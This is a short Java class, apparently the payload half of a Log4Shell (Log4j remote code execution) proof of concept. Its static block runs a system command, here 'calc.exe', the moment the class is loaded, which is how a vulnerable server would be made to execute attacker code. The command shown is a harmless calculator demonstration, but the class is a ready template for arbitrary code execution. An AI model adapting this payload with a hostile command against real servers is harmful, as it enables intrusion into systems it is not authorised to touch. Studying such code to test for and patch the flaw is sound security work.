public class Log4jRCE {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc.exe"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}